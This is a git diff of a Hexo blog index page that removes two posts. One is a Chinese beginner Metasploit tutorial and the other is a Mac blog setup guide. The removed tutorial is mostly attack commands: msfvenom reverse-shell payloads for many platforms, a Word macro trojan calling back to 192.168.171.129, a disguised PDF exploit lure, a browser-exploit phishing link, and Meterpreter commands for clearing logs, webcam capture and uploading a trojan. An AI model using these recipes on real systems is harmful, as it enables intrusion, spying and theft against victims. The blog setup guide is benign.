@@ -30,7 +30,7 @@
 <meta name="twitter:card" content="summary">
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/combine/npm/highlight.js@9.15.8/styles/atom-one-dark.css,gh/nexmoe/nexmoe.github.io@latest/lib/mdui_043tiny/css/mdui.css,gh/nexmoe/nexmoe.github.io@latest/lib/iconfont/iconfont.css,gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css?v=233" crossorigin>
   
-  <link rel="stylesheet" href="/css/style.css?v=1608691997402">
+  <link rel="stylesheet" href="/css/style.css?v=1608693630494">
 <meta name="generator" content="Hexo 5.2.0"></head>
 
 <body class="mdui-drawer-body-left">
@@ -165,82 +165,7 @@
 
         <article>
             
-                <a id="more"></a>
-<h1 id="msf小白学习教程一"><a href="#msf小白学习教程一" class="headerlink" title="msf小白学习教程一"></a><center>msf小白学习教程一</center></h1><p>作者：pgg学长<br>前言：记得以前老师教的还是挺认真的，但是好久没用，有些生疏，于是就借在学校学习时复习了一遍，顺便写下了这篇文章。</p>
-<hr>
-<h3 id="1-msf是什么？"><a href="#1-msf是什么？" class="headerlink" title="1.msf是什么？"></a>1.msf是什么？</h3><p>msf全称：metasplpit<br>   作用：Metasploit是一个渗透测试平台<br>   环境：kali-linux 自动搭建了msf环境  </p>
-<h3 id="2-msf的详细分解"><a href="#2-msf的详细分解" class="headerlink" title="2.msf的详细分解"></a>2.msf的详细分解</h3><p><em>在这边我就化繁为简，把一些我感觉重要常用的功能详细的讲解一番。</em>  </p>
-<h4 id="2-1搜索模块"><a href="#2-1搜索模块" class="headerlink" title="2.1搜索模块"></a>2.1搜索模块</h4><p>首先肯定是启动msf，启动就很简单了，在kali命令行输入:<code>msfconsole </code> 如果记不住，可以直接：<code>msfc</code>然后加一个tab，然后就会自动补全，回车就好了。<br><img src="https://cdn.jsdelivr.net/gh/pggbo/pggbo.github.io@master/css/tupian/013.png"><br><img src="https://cdn.jsdelivr.net/gh/pggbo/pggbo.github.io@master/css/tupian/014.png">  </p>
-<hr>
-<h5 id="2-1-1-搜索模块命令：search"><a href="#2-1-1-搜索模块命令：search" class="headerlink" title="2.1.1 搜索模块命令：search"></a>2.1.1 搜索模块命令：<code>search</code></h5><p>命令介绍：msfconsole包含广泛的基于正则表达式的搜索功能。如果您对所查找内容有一个大致的了解，则可以通过搜索进行搜索。在下面的输出中，正在搜索MS Bulletin MS09-011。搜索功能将在模块名称，描述，引用等内找到该字符串。</p>
-<p>请注意，Metasploit模块的命名约定使用下划线和连字符。<br>msf &gt; search usermap_script</p>
-<p>Name                                Disclosure Date  Rank       Description</p>
-<hr>
-<p>   exploit/multi/samba/usermap_script    2007-05-14       excellent  Samba “username map script” Command Execution</p>
-<h5 id="2-1-2-help"><a href="#2-1-2-help" class="headerlink" title="2.1.2 help"></a>2.1.2 help</h5><p>您可以使用内置的关键字系统进一步优化您的搜索。命令：<code>help search</code><br><img src="https://cdn.jsdelivr.net/gh/pggbo/pggbo.github.io@master/css/tupian/015.png"><br><img src="https://cdn.jsdelivr.net/gh/pggbo/pggbo.github.io@master/css/tupian/016.png"></p>
-<p>要使用描述性名称进行搜索，请使用name关键字。<br><img src="https://cdn.jsdelivr.net/gh/pggbo/pggbo.github.io@master/css/tupian/017.png"></p>
-<p>您可以使用platform将搜索范围缩小到影响特定platform（平台）的模块。<br><img src="https://cdn.jsdelivr.net/gh/pggbo/pggbo.github.io@master/css/tupian/018.png"></p>
-<p>使用该type可以按模块类型进行过滤，如auxiliary（辅助），post（提交），exploit（利用）等。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/pggbo/pggbo.github.io@master/css/tupian/019.png"><br>使用author关键字搜索可让您搜索您最喜爱的作者的模块<br><img src="https://cdn.jsdelivr.net/gh/pggbo/pggbo.github.io@master/css/tupian/020.png"><br>当然，<code>search</code>命令还可以在拿到一定权限时，可以在受害者机器内搜索想要的信息<br>Meterpreter具有搜索功能，默认情况下，该功能将清除受感染计算机上的所有驱动器，以查找您选择的文件。<br>meterpreter &gt; search -h<br>Usage: search [-d dir] [-r recurse] -f pattern<br>Search for files.<br>OPTIONS:<br>-d   开始从中搜索的 目录/驱动器。 留空以搜索所有驱动器。 （默认：）<br>    -f   要搜索的文件模式glob。 （例如* secret * .doc？）<br>    -h   帮助横幅。<br>    -r   递归搜索子目录。 （默认：true）<br> <br>要在计算机上运行所有jpeg文件搜索，只需使用’-f’开关运行搜索命令并告诉它要查找哪种文件类型。<br>meterpreter &gt; search -f *.jpg<br>Found 418 results…<br>…snip…<br>    c:\Documents and Settings\All Users\Documents\My Pictures\Sample Pictures\Blue hills.jpg (28521 bytes)<br>    c:\Documents and Settings\All Users\Documents\My Pictures\Sample Pictures\Sunset.jpg (71189 bytes)<br>    c:\Documents and Settings\All Users\Documents\My Pictures\Sample Pictures\Water lilies.jpg (83794 bytes)<br>    c:\Documents and Settings\All Users\Documents\My Pictures\Sample Pictures\Winter.jpg (105542 bytes)<br>…snip…<br> <br>搜索整台计算机可能需要很长时间，并且观察用户可能会注意到他们的硬盘不断颠簸。我们可以通过将它指向一个起始目录并让它运行来缩短搜索时间。<br>meterpreter &gt; search -d c:\documents\ and\ settings\administrator\desktop\ -f *.pdf<br>Found 2 results…<br>    c:\documents and settings\administrator\desktop\operations_plan.pdf (244066 bytes)<br>    c:\documents and settings\administrator\desktop\budget.pdf (244066 bytes)<br>meterpreter &gt;</p>
-<h4 id="2-2-msf与meterpreter命令大全"><a href="#2-2-msf与meterpreter命令大全" class="headerlink" title="2.2 msf与meterpreter命令大全"></a>2.2 msf与meterpreter命令大全</h4><h5 id="2-2-1-msf命令"><a href="#2-2-1-msf命令" class="headerlink" title="2.2.1 msf命令"></a>2.2.1 msf命令</h5><hr>
-<p>核心命令<br>？   帮助菜单<br>banner   显示一个真棒metasploit横幅<br>cd   更改当前的工作目录<br>color   切换颜色<br>connect   连接与主机通信<br>exit   退出控制台<br>get   获取特定于上下文的变量的值<br>getg   获取全局变量的值<br>grep grep另一个命令的输出<br>help   帮助菜单<br>history   显示命令历史<br>irb   进入irb脚本模式<br>load   加载一个框架插件<br>quit   退出控制台<br>route   通过会话路由流量<br>save   保存活动的数据存储<br>sessions    转储会话列表并显示有关会话的信息<br>set   将特定于上下文的变量设置为一个值<br>setg   将全局变量设置为一个值<br>sleep   在指定的秒数内不做任何事情<br>spool   将控制台输出写入文件以及屏幕<br>threads   线程查看和操作后台线程<br>unload   卸载框架插件<br>unset   取消设置一个或多个特定于上下文的变量<br>unsetg   取消设置一个或多个全局变量<br>version   显示框架和控制台库版本号<br> <br>模块命令<br>advanced   显示一个或多个模块的高级选项<br>back   从当前上下文返回<br>edit   使用首选编辑器编辑当前模块<br>info   显示有关一个或多个模块的信息<br>loadpath   路径从路径搜索并加载模块<br>options   显示全局选项或一个或多个模块<br>popm   将最新的模块从堆栈中弹出并使其处于活动状态<br>previous   将之前加载的模块设置为当前模块<br>pushm   将活动或模块列表推入模块堆栈<br>reload_all   从所有定义的模块路径重新加载所有模块<br>search   搜索模块名称和描述<br>show   显示给定类型的模块或所有模块<br>use   按名称选择模块<br> <br>工作命令<br>handler   作为作业启动负载处理程序<br>jobs   显示和管理作业<br>kill   杀死一个工作<br>rename_job   重命名作业<br> <br>资源脚本命令<br>makerc   保存从开始到文件输入的命令<br>resource   运行存储在文件中的命令<br> <br>数据库后端命令<br>db_connect   连接到现有的数据库<br>db_disconnect   断开与当前数据库实例的连接<br>db_export   导出包含数据库内容的文件<br>db_import   导入扫描结果文件（文件类型将被自动检测）<br>db_nmap   执行nmap并自动记录输出<br>db_rebuild_cache   重建数据库存储的模块高速缓存<br>db_status   显示当前的数据库状态<br>hosts   列出数据库中的所有主机<br>loot   列出数据库中的所有战利品<br>notes   列出数据库中的所有笔记<br>services   列出数据库中的所有服务<br>vulns   列出数据库中的所有漏洞<br>workspace   在数据库工作区之间切换<br> <br>凭证后端命令<br>creds   列出数据库中的所有凭据</p>
-<hr>
-<h5 id="2-2-2-meterpreter命令"><a href="#2-2-2-meterpreter命令" class="headerlink" title="2.2.2 meterpreter命令"></a>2.2.2 meterpreter命令</h5><hr>
-<p>.background    从meterpreter退出到msf里</p>
-<p>.sessions -i 1   进入meterpreter里</p>
-<p>.cat   查看文件内容</p>
-<p>.clearev   清楚日志</p>
-<p>.download  从远程机器下载文件  download c:\boot.ini</p>
-<p>.edit  打开文件。 meterpreter &gt; edit edit.txt</p>
-<p>.execute  命令在目标上运行一个命令。meterpreter &gt; execute -f cmd.exe -i -H。</p>
-<p>.getuid  显示服务器上运行的用户</p>
-<p>.idletume  显示远程机器上的用户空闲的秒数</p>
-<p>.lpwd&gt;lcd  lpwd-显示当前目录 lcd-跳转到哪个目录</p>
-<p>.migrate  迁移到受害者的另一个进程 meterpreter &gt; run post/windows/manage/migrate </p>
-<p>.ps  显示正在运行进程的列表</p>
-<p>.resource  执行文本里的meterpreter命令    resource 1.txt</p>
-<p>.search  查找特定文件  search -f *.doc</p>
-<p>.shell  将提供目标系统上的标准shell</p>
-<p>.upload 上传文件 meterpreter &gt; upload evil_trojan.exe c:\windows\system32 </p>
-<p>.webcam_list  显示网络摄像头</p>
-<p>.webcam_snap  从目标系统上已连接网络的摄像头抓取图片 </p>
-<hr>
-<h4 id="2-3-msf生成木马教程"><a href="#2-3-msf生成木马教程" class="headerlink" title="2.3 msf生成木马教程"></a>2.3 msf生成木马教程</h4><p><del>把网上的一些资源整合了一下，还把word宏木马等也加进来了，方便大家利用</del></p>
-<h5 id="2-3-1-生成木马命令：msfvenom"><a href="#2-3-1-生成木马命令：msfvenom" class="headerlink" title="2.3.1 生成木马命令：msfvenom"></a>2.3.1 生成木马命令：<code>msfvenom</code></h5><p>msfcenom详细语法<br>-e, –encoder [encoder] 指定需要使用的encoder（编码器）<br>-a, –arch &lt; architecture&gt; 指定payload的目标架构<br>–platform &lt; platform&gt; 指定payload的目标平台<br>-s, –space &lt; length&gt; 设定有效攻击荷载的最大长度<br>-b, –bad-chars &lt; list&gt; 设定规避字符集，比如: &amp; #039;\x00\xff&amp; #039;<br>-i, –iterations &lt; count&gt; 指定payload的编码次数<br>-c, –add-code &lt; path&gt; 指定一个附加的win32 shellcode文件<br>-x, –template &lt; path&gt; 指定一个自定义的可执行文件作为模板<br>-k, –keep 保护模板程序的动作，注入的payload作为一个新的进程运行<br>–payload-options 列举payload的标准选项<br>-o, –out &lt; path&gt; 保存payload<br>-v, –var-name &lt; name&gt; 指定一个自定义的变量，以确定输出格式<br>–shellest 最小化生成payload<br>-h, –help 查看帮助选项<br>–help-formats 查看msf支持的输出格式列表</p>
-<h5 id="2-3-2-生成木马语句"><a href="#2-3-2-生成木马语句" class="headerlink" title="2.3.2 生成木马语句"></a>2.3.2 生成木马语句</h5><p>二进制<br>linux:<code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= LPORT= -f elf &gt; shell.elf</code></p>
-<p>windows:<code>msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe &gt; shell.exe</code></p>
-<p>mac: <code>msfvenom -p osx/x86/shell_reverse_tcp LHOST= LPORT= -f macho &gt; shell.macho</code></p>
-<p>web<br>php:<code>msfvenom -p php/meterpreter_reverse_tcp LHOST= LPORT= -f raw &gt; shell.php</code> <code>cat shell.php | pbcopy &amp;&amp; echo &#39;&lt;?php ’ | tr -d ‘\n’ &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</code></p>
-<p>asp:<code>msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f asp &gt; shell.asp</code></p>
-<p>jap:<code>msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f raw &gt; shell.jsp</code></p>
-<p>war:<code>msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f war &gt; shell.war</code></p>
-<p>脚本<br>python:<code>msfvenom -p cmd/unix/reverse_python LHOST= LPORT= -f raw &gt; shell.py</code></p>
-<p>bash:<code>msfvenom -p cmd/unix/reverse_bash LHOST= LPORT= -f raw &gt; shell.sh</code></p>
-<p>perl:<code>msfvenom -p cmd/unix/reverse_perl LHOST= LPORT= -f raw &gt; shell.pl</code></p>
-<p>基于pdf的shellcode<br><code>use exploit/windows/fileformat/adobe_utilprintf</code><br>msf5 exploit(adobe_utilprintf)&gt;<code>set FILENAME BestComputers-UpgradeInstructions.pdfset</code></p>
-<p><code>PAYLOAD windows/meterpreter/reverse_tcp</code><br><em>其他的就自己填就好了</em></p>
-<hr>
-<p>读到这里，大家肯定会感到疑惑，生成木马后怎么获取权限呢，那么我在这里给出答复，一般情况下用两种方式，一种是用msf的监听模块，还有一种就是nc反弹了，这里我就讲解下msf的监听模块，nc大家就自行百度下</p>
-<hr>
-<p>监听模块：<code>use exploit/multi/handler</code><br>添加ip,端口不需要讲解吧<br>添加payload:<code>set payload</code><br>payload是生成木马的payload<br>然后运行：<code>exploit</code></p>
-<p>接下来的比较有意思，基于word的shellcode</p>
-<p>生成payload:<code>msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.171.129 LPORT=4444 -e x86/shikata_ga_nai -f vba-exe</code></p>
-<p>生成的内容分为两个部分，一部分是宏执行的vba代码，另一部分是payload<br><img src="https://cdn.jsdelivr.net/gh/pggbo/pggbo.github.io@master/css/tupian/021.png"></p>
-<p>然后生成一个空白的word文件</p>
-<p><img src="https://cdn.jsdelivr.net/gh/pggbo/pggbo.github.io@master/css/tupian/022.png"></p>
-<p>宏名随便输入，然后点击创建，我们拷贝生成的第一部分的内容到这里，然后点击保存</p>
-<p><img src="https://cdn.jsdelivr.net/gh/pggbo/pggbo.github.io@master/css/tupian/023.png"></p>
-<p>我们现在再打开宏，可以看到生成了下面几个宏<br><img src="https://cdn.jsdelivr.net/gh/pggbo/pggbo.github.io@master/css/tupian/024.png"></p>
-<p>然后我们拷贝第二部分，贴到word文档的正文里面，然后保存关闭<br><img src="https://cdn.jsdelivr.net/gh/pggbo/pggbo.github.io@master/css/tupian/025.png"><br>然后在Kali上启动侦听<br>use exploit/multi/handler<br>set PAYLOAD windows/meterpreter/reverse_tcp<br>set LHOST 192.168.171.129<br>exploit<br>当在Windows启动刚刚的word时，我们就取得shell了</p>
-<h4 id="2-4-链接钓鱼"><a href="#2-4-链接钓鱼" class="headerlink" title="2.4 链接钓鱼"></a>2.4 链接钓鱼</h4><p>运行命令：<code>use exploit/windows/browser/ms10_002_aurora</code><br>接着添加：<code>set URIPATH /</code><br>加上payload:<code>set PAYLOAD windows/meterpreter/reverse_tcp </code><br>运行：<code>exploit -j</code><br>当目标访问我们的恶意URL时，我们就得到了shell</p>
-<hr>
-<hr>
-<p><em><strong><em>当然，文章还没有写完，请继续查看第二部分的教程</em></strong></em></p>
-<hr>
-<p>/##此教程仅供参考学习，请勿用于非法操作，请牢记网络安全法。</p>
-<hr>
-<p>##本文章参考付杰表哥写的文章做的总结：<code>https://www.fujieace.com/metasploit/tutorials.html</code></p>
-
+                <h1 id="msf小白学习教程一"><a href="#msf小白学习教程一" class="headerlink" title="msf小白学习教程一"></a><center>msf小白学习教程一</center></h1>
             
         </article>
     </div>
@@ -263,35 +188,7 @@
 
         <article>
             
-                <a id="more"></a>
-<h1 id="mac博客搭建"><a href="#mac博客搭建" class="headerlink" title="mac博客搭建"></a><center>mac博客搭建</center></h1><hr>
-<p>####作者：pgg学长<br>####<em>前言：之前用windows搭建过博客，因为图片原因，导致荒废不用，近期突然又想用mac重新搭建一个博客，本以为可以很轻松的解决，但没想到碰到了一个又一个的坑，直到最后我都想放弃，使用虚拟机搭建，功夫不负有心人，最后一天晚上完成了基础的博客搭建。</em><br><em><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>__</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></em><br>####*<strong><strong>**</strong></strong>需提示：搭建博客时大部分命令都需要使用sudo才可以成功执行，因为我已经搭建好了才写的博客，我也忘了哪里需要用sudo，请大家多加尝试，我只记得踩的最大的坑，就是后面需要生成ssh密钥的那个命令，切记不要使用sudo，当然后面我也会说明如果不小心使用了该怎么处理。*<strong><strong><strong>****</strong></strong></strong>  </p>
-<hr>
-<p>###<strong><em>第一步</em></strong>：注册github<br><em>1.访问<code>github.com</code>,然后注册登陆。</em>  </p>
-<p><em>2.在github上创建一个库。</em><br><img src="https://cdn.jsdelivr.net/gh/pggbo/pggbo.github.io@master/css/tupian/001.png"><br><img src="https://cdn.jsdelivr.net/gh/pggbo/pggbo.github.io@master/css/tupian/002.png">  </p>
-<hr>
-<p>然后其他的就正常的下一步就好了。<br>###<strong><em>第二步</em></strong>：安装git、node、hexo<br><em>1.查看电脑是否已经安装，这就很简单了，直接用终端使用命令，就可以知道是否安装。</em>  </p>
-<p><em>2.如果有没有安装的环境，可以用最简单的brew安装方式，列如命令：<code>brew install node</code></em>  </p>
-<p><em>3.以上环境都安装好了，就可以安装hexo了，安装命令：<code>npm install -g hexo-cli</code>  *<br>###*<strong>第三步</strong></em>：初始化建立博客框架<br><em>1.在你想建立博客的目录下创建一个blog文件夹，命令：<code>sudo mkdir blog</code></em>  </p>
-<p><img src="https://cdn.jsdelivr.net/gh/pggbo/pggbo.github.io@master/css/tupian/003.png"><br>应该都会用命令行操作吧，我推荐在 opt 目录下建一个目录，然后再在里面建项目</p>
-<p><em>2.<code>cd blog</code> 进入目录</em></p>
-<p><em>3.<code>sudo hexo init</code>  初始化目录</em>  </p>
-<p><em>4.<code>sudo npm install</code>  安装需要的组件</em><br>如果网速慢的话可以改一下源，命令：<code>sudo npm install -g cnpm --registry=https://registry.npm.taobao.org</code><br><code>cnpm install hexo-cli -g</code><br>换源后速度飞起</p>
-<p><em>5.<code>sudo hexo g</code>   生成静态文件</em>  </p>
-<p><em>6.<code>sudo hexo s</code>  启动服务器，然后在浏览器输入<code>http://localhost:4000/</code>打开我们的博客界面！</em></p>
-<p><img src="https://cdn.jsdelivr.net/gh/pggbo/pggbo.github.io@master/css/tupian/004.png">   </p>
-<p>**一定要在 blog目录下运行，不然会报错。<br><img src="https://cdn.jsdelivr.net/gh/pggbo/pggbo.github.io@master/css/tupian/005.png"></p>
-<p>###<strong><em>第四步</em></strong>发布到github上<br><em>1.设置git的名字和邮箱</em><br>命令：<code>git config --global user.name &quot;yourname&quot; </code><br>命令：<code>git config --global user.email &quot;youremail&quot;</code>  </p>
-<p><em>2.博客关联github</em><br>编辑_config.yml文件，把其中名字改为你的github<br><img src="https://cdn.jsdelivr.net/gh/pggbo/pggbo.github.io@master/css/tupian/.png"><br>修改处在最下面<br><img src="https://cdn.jsdelivr.net/gh/pggbo/pggbo.github.io@master/css/tupian/007.png">  </p>
-<p><em>3.安装git上部署文章的扩展，命令：<code>sudo npm install hexo-deployer-git --save</code></em>  </p>
-<p><em>4.编写文章</em><br><code>sudo hexo new post &quot;博客名&quot;</code>,<br>博客文章的源文件会出现在source/_posts文件夹内  </p>
-<p><em>5.生成ssh密钥</em><br>首先生成ssh-key,命令：<code>ssh-keygen -t rsa -C&quot;you_email&quot;</code><br>记住，邮箱上注册github的邮箱。</p>
-<p>生成时一直回车，不要打密码，而且生成时会告诉你生成在哪个目录内，如果忘了，可以使用命令：<code>ssh-add ~/.ssh/id_rsa</code><br>查看路径在哪里，切记不要使用sudo 生成密钥，不然会到root下面，怎么也访问不了，最大的坑不是这个，而是git会默认使用root下的私钥，而你自己查找时找不到哪个地方路径，也访问不了，意思就是，你不小心使用了sudo, 后面没用sudo了，然后把生成的放进github里面，发现连接不上，然后搜报错也不知道怎么解决，我还是在一个无关紧要的网站上看到可以使用<code>ssh-add</code>查看自己的私钥在哪里，发现了git的默认私钥不是我使用的私钥，而是root下的，然后我使用<code>sudo rm -r</code>删掉那个私钥后，重新生成才成功连接了，虽然说出来没什么，但是在没有教程，自己踩坑的情况下，特别折磨<br><img src="https://cdn.jsdelivr.net/gh/pggbo/pggbo.github.io@master/css/tupian/008.png"><br>然后<code>vim id_rsa.pub</code>  复制公钥，然后放在github上  </p>
-<p><em>6.添加ssh密钥</em><br>点击SSH and GPG keys，创建新的SSH，把公钥复制进去，然后提交<br><img src="https://cdn.jsdelivr.net/gh/pggbo/pggbo.github.io@master/css/tupian/009.png"><br><img src="https://cdn.jsdelivr.net/gh/pggbo/pggbo.github.io@master/css/tupian/010.png">  </p>
-<p><em>7.发布成功</em><br><code>sudo hexo g</code>  产生静态页面  </p>
-<p><code>sudo hexo d</code>  部署到github上面</p>
-<p><em>8.访问</em><br><img src="https://cdn.jsdelivr.net/gh/pggbo/pggbo.github.io@master/css/tupian/011.png"><br>往下拉<br><img src="https://cdn.jsdelivr.net/gh/pggbo/pggbo.github.io@master/css/tupian/012.png"></p>
-<h5 id="结语：虽然写这篇文章时也是在网上找的教程，但是我发现好多教程不太全面，而且有些命令都有些错误，还有一些很奇奇怪怪的坑，也没有很好的解决方式，希望大家看完我的教程，可以有新的收获。"><a href="#结语：虽然写这篇文章时也是在网上找的教程，但是我发现好多教程不太全面，而且有些命令都有些错误，还有一些很奇奇怪怪的坑，也没有很好的解决方式，希望大家看完我的教程，可以有新的收获。" class="headerlink" title="结语：虽然写这篇文章时也是在网上找的教程，但是我发现好多教程不太全面，而且有些命令都有些错误，还有一些很奇奇怪怪的坑，也没有很好的解决方式，希望大家看完我的教程，可以有新的收获。"></a><strong><em>结语：虽然写这篇文章时也是在网上找的教程，但是我发现好多教程不太全面，而且有些命令都有些错误，还有一些很奇奇怪怪的坑，也没有很好的解决方式，希望大家看完我的教程，可以有新的收获。</em></strong></h5>
+                <h1 id="mac博客搭建"><a href="#mac博客搭建" class="headerlink" title="mac博客搭建"></a><center>mac博客搭建</center></h1>
             
         </article>
     </div>
@@ -310,7 +207,7 @@
 
 
 <script src="https://cdn.jsdelivr.net/gh/xtaodada/xtaodada.github.io@0.0.2/copy.js"></script>
- <script src="/js/app.js?v=1608691997402"></script>
+ <script src="/js/app.js?v=1608693630494"></script>
 
   
 
